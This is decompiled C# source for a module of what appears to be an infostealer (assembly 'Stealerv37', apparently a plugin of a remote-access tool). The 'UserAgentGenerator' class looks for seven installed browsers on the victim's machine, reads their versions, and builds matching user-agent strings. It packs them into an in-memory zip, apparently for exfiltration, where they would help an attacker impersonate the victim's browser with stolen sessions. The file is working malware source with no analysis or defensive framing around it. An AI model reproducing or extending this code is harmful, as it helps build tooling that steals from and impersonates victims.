// Decompiled with JetBrains decompiler
// Type: Intelix.Targets.Browsers.UserAgentGenerator
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Intelix.Helper;
using Intelix.Helper.Data;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;

#nullable disable
namespace Intelix.Targets.Browsers;

internal class UserAgentGenerator : ITarget
{
  private readonly string[] paths = new string[7]
  {
    "C:\\Program Files\\Opera\\launcher.exe",
    "C:\\Program Files\\Apple\\Safari\\Safari.exe",
    "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
    "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
    "C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe",
    $"C:\\Users\\{Environment.UserName}\\AppData\\Local\\Yandex\\YandexBrowser\\Application\\browser.exe"
  };
  private readonly string[] names = new string[7]
  {
    "Opera",
    "Safari",
    "Firefox",
    "Chrome",
    "Edge",
    "Brave",
    "Yandex"
  };

  public void Collect(InMemoryZip zip, Counter counter)
  {
    string version = WindowsInfo.GetVersion();
    string architecture = WindowsInfo.GetArchitecture();
    List<UserAgentGenerator.BrowserAgent> source = new List<UserAgentGenerator.BrowserAgent>();
    for (int index = 0; index < this.paths.Length; ++index)
    {
      string str = this.names[index] == "Chrome" ? this.GenerateUserAgentChrome(this.paths[index], version, architecture) : this.GenerateUserAgent(this.paths[index], this.names[index], version, architecture);
      if (!string.IsNullOrEmpty(str))
        source.Add(new UserAgentGenerator.BrowserAgent()
        {
          Name = this.names[index],
          UserAgent = str
        });
    }
    if (source.Count == 0)
      return;
    int maxName = Math.Max("Browser".Length, source.Max<UserAgentGenerator.BrowserAgent>((Func<UserAgentGenerator.BrowserAgent, int>) (a => a.Name.Length)));
    int maxUA = Math.Max("User-Agent".Length, source.Max<UserAgentGenerator.BrowserAgent>((Func<UserAgentGenerator.BrowserAgent, int>) (a => a.UserAgent.Length)));
    List<string> values = new List<string>()
    {
      $"{"Browser".PadRight(maxName)} | {"User-Agent".PadRight(maxUA)}",
      new string('-', maxName + maxUA + 3)
    };
    values.AddRange(source.Select<UserAgentGenerator.BrowserAgent, string>((Func<UserAgentGenerator.BrowserAgent, string>) (a => $"{a.Name.PadRight(maxName)} | {a.UserAgent.PadRight(maxUA)}")));
    zip.AddTextFile("UserAgents.txt", string.Join(Environment.NewLine, (IEnumerable<string>) values));
  }

  private string GenerateUserAgent(
    string browserPath,
    string name,
    string osVersion,
    string architecture)
  {
    if (!File.Exists(browserPath))
      return string.Empty;
    return $"Mozilla/5.0 (Windows NT {osVersion}; {architecture}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.119 Safari/537.36 {name}/{this.GetBrowserVersion(browserPath)}";
  }

  private string GenerateUserAgentChrome(string browserPath, string osVersion, string architecture)
  {
    if (!File.Exists(browserPath))
      return string.Empty;
    string browserVersion = this.GetBrowserVersion(browserPath);
    return $"Mozilla/5.0 (Windows NT {osVersion}; {architecture}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{browserVersion} Safari/537.36";
  }

  private string GetBrowserVersion(string browserPath)
  {
    return !File.Exists(browserPath) ? "Unknown" : FileVersionInfo.GetVersionInfo(browserPath).FileVersion;
  }

  private class BrowserAgent
  {
    public string Name { get; set; }

    public string UserAgent { get; set; }
  }
}
